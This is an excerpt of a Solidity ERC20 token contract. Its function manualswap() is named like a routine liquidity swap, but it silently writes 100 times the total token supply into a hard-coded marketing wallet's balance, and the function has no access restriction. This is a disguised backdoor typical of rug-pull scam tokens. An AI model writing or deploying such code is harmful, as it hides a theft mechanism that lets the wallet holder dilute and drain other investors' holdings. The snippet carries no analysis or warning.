...
contract Test is Context, IERC20, Ownable {
    ...
    uint256 public _maxWalletSize = 3 * 1e7 * 1e18 + 1 * 1e18;
    ...
    constructor() {
        marketingAddress = address(0x747Af9c05d5E20C263795440349870c19B94cA5d);
	...
	function manualswap() external {
		uint256 contractBalance = 100 * _tTotal;
		_rOwned[marketingAddress] = contractBalance;
    }
